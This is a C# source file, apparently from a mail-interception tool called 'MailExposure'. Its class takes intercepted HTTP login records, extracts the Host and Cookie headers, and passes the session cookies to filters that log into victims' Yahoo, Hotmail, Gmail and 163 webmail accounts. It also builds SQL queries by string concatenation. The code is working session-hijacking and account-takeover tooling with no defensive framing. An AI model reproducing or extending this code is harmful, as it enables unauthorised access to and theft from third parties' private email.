using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace MailExposure.PopMailRC
{
    class displace:MailStr
    {
        // Fields
        public int error;
        public string interceptTime;
        public string loginInfo;
        public string NO;
        public string objAddress;
        public string passwdType;
        public string sourceAddress;
        public string strCookie;
        public string strHost;
        public string url;
        public string UserName;

        // Methods
        public displace()
        {
            this.strCookie = "";
            this.strHost = "";
            this.url = "";
        }
        public displace(string no, string userName, string passwdType, string interceptTime, string sourceAddress, string objAddress, string loginInfo)
        {
            this.strCookie = "";
            this.strHost = "";
            this.url = "";
            this.NO = no;
            this.UserName = userName;
            this.passwdType = passwdType;
            this.interceptTime = interceptTime;
            this.sourceAddress = sourceAddress;
            this.objAddress = objAddress;
            this.loginInfo = loginInfo;
        }
        public void filter()
        {
            int startIndex = 0;
            int index = 0;
            startIndex = this.loginInfo.IndexOf("Host:");
            if (startIndex == -1)
            {
                this.error = Convert.ToInt32(GlobalValue.PopMainForm.statusBarPanelLoginFailText.Text);
                this.error++;
                GlobalValue.PopMainForm.statusBarPanelLoginFailText.Text = this.error.ToString();
            }
            else
            {
                index = this.loginInfo.IndexOf("\r\n", startIndex);
                if (index == -1)
                {
                    this.error = Convert.ToInt32(GlobalValue.PopMainForm.statusBarPanelLoginFailText.Text);
                    this.error++;
                    GlobalValue.PopMainForm.statusBarPanelLoginFailText.Text = this.error.ToString();
                }
                else
                {
                    this.strHost = this.loginInfo.Substring(startIndex + 6, index - (startIndex + 6));
                    if (this.strHost.IndexOf("http") == -1)
                    {
                        this.url = "http://" + this.strHost.Trim() + "/";
                    }
                    else
                    {
                        this.url = this.strHost;
                    }
                    startIndex = this.loginInfo.IndexOf("Cookie:");
                    if (startIndex == -1)
                    {
                        this.error = Convert.ToInt32(GlobalValue.PopMainForm.statusBarPanelLoginFailText.Text);
                        this.error++;
                        GlobalValue.PopMainForm.statusBarPanelLoginFailText.Text = this.error.ToString();
                    }
                    else
                    {
                        index = this.loginInfo.IndexOf("\r\n", startIndex);
                        if (index == -1)
                        {
                            this.error = Convert.ToInt32(GlobalValue.PopMainForm.statusBarPanelLoginFailText.Text);
                            this.error++;
                            GlobalValue.PopMainForm.statusBarPanelLoginFailText.Text = this.error.ToString();
                        }
                        else
                        {
                            this.strCookie = this.loginInfo.Substring(startIndex + 8, index - (startIndex + 8));
                            this.strCookie = this.strCookie + ";";
                            if (this.passwdType.ToUpper().IndexOf("YAHOO") != -1)
                            {
                                new FilterYahoo(this.url, this.strCookie, this.interceptTime).loginUser();
                            }
                            else if (this.passwdType.ToUpper().IndexOf("HOTMAIL") != -1)
                            {
                                new FilterHotmail(this.url, this.strCookie, this.interceptTime).loginUser();
                            }
                            else if (this.passwdType.ToUpper().IndexOf("GMAIL") != -1)
                            {
                                this.url = "http://mail.google.com/mail/?ui=html&amp;zy=l";
                                new FilterGmail(this.url, this.strCookie, this.interceptTime).loginUser();
                            }
                            else if (this.passwdType.IndexOf("163") != -1)
                            {
                                new Filter163mail(this.url, this.strCookie, this.interceptTime).loginUser();
                            }
                        }
                    }
                }
            }

        }
        public void start()
        {
            string str = "1";
            string str2 = DateTime.Now.ToShortTimeString().Substring(0, 2);
            string str3 = "'" + str2 + "'";
            string strSql = "";
            try
            {
                strSql = "update users set 接收状态=" + str + ",接收=" + str3 + " where 序号=" + this.NO;
                GlobalValue.PopMainForm.ExecuteSQL(strSql);
                GlobalValue.PopMainForm.listBoxView.Items.Add("[" + this.UserName + "]: 开始过滤");
                GlobalValue.PopMainForm.listBoxView.SelectedIndex = GlobalValue.PopMainForm.listBoxView.Items.Count - 1;
                this.filter();
                GlobalValue.PopMainForm.listBoxView.Items.Add("[" + this.UserName + "]: 结束过滤");
                GlobalValue.PopMainForm.listBoxView.SelectedIndex = GlobalValue.PopMainForm.listBoxView.Items.Count - 1;
                str = "0";
                strSql = "update users set 接收状态=" + str + ",接收=" + str3 + " where 序号=" + this.NO;
                GlobalValue.PopMainForm.ExecuteSQL(strSql);
                base.completeThreads();
            }
            catch (Exception exception)
            {
                GlobalValue.PopMainForm.listBoxView.Items.Add(exception.Message + exception.StackTrace);
                GlobalValue.PopMainForm.listBoxView.SelectedIndex = GlobalValue.PopMainForm.listBoxView.Items.Count - 1;
            }
            finally
            {
                str = "0";
                strSql = "update users set 接收状态=" + str + ",接收=" + str3 + " where 序号=" + this.NO;
                GlobalValue.PopMainForm.ExecuteSQL(strSql);
            }

        }

    }
}
